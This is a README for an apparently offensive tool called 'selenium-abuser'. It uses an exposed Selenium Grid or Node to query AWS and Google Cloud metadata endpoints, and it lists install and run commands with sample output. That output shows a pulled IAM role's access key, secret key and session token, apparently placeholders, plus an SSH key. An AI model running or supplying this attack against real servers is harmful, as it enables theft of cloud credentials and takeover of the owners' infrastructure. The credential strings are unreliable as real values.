# selenium-abuser
Abuse Open Selenium Gird or Node to get access to metadata endpoint.

This will auto detect if the IP or url is AWS or GC and then attempt to pull as much data from the AWS metadata endpoint.

GC just pulls the public-ssh keys for identification.


Python3 Requirements
----


```
pip3 install dnspython
pip3 install selenium
pip3 install requests
```

How to Run
----

```
python3 sel.py -s http://myserver:5555
```

Result
---


```
[*] Testing: 127.0.0.1 on Port: 5555[*]

[*] IAM Role Name: AmazonLightsailInstanceRole [*]
[*] IAM Role Key: {
  "Code" : "Success",
  "LastUpdated" : "2018-02-15T11:00:18Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIARGJX2JH2K34234JHKJH234",
  "SecretAccessKey" : "I+dz4jQ0FWyqJHLK234LKJH234JK32H234KJH34JLK2423423ADC9KqjCNkG",
  "Token" : "FQoGZXIvYXdzEMT//////////wEaDJ+Qc8GIXWtxnXL4DSK5A8Ch8yOv4gmAcTBRxruDL9qeHwfYbPrE2a8eZWL8w0HNNetmoDEJbAfpoQobNWFXPRYUK5Z9+tJa3yGKsDX1FZqU2ZALJK23H4LKJ23HLKJ23H423LKJH23LKJH2K4H23408329Y0239J30J230IJ234I2J3O43IKJ2L3KJLK342234yXbL7zD67uN2TgHKOwdCw0ZCIFrbuLEddTD0okzbja0zmj4VA2KUPgNnoHUPbkqVYOMcfT8Rp05DvjKxupy3290caA52gULR2KQMxgTPy/1/TsV+J/j/7VlhdacgTk4TDvy7PaiYHTmYyoYrLxW7z2GDcs3oCmV2DBELn3JSNXJfrwlcMqDkKYT0sdLI6KbnxsTtLChUkBbLRPAwc4Jf6J+l/UmxgDlZ713qiosIHvW2Wtn1JNeHpSuFFY++CfhHtYT0fRJbvX4HH4fEnpWYu85tTdDv1JFjgsMKP0GOE+yJn/XZClnBhmA8BRSTmx8JuOvowZPWyCVaiORD35c8jI2euzeA2TMI95m3fckgUBWWqhXhHeJF4voNefSzT4lw63b32423424324233tuSit+vbhBQ==",
  "Expiration" : "2018-07-15T17:13:56Z"
}
[*]


[*] AWS Public SSH Key:
  ssh-rsa Some Publickey LightsailDefaultKeyPair
 [*]


[*] User Data: None [*]
```
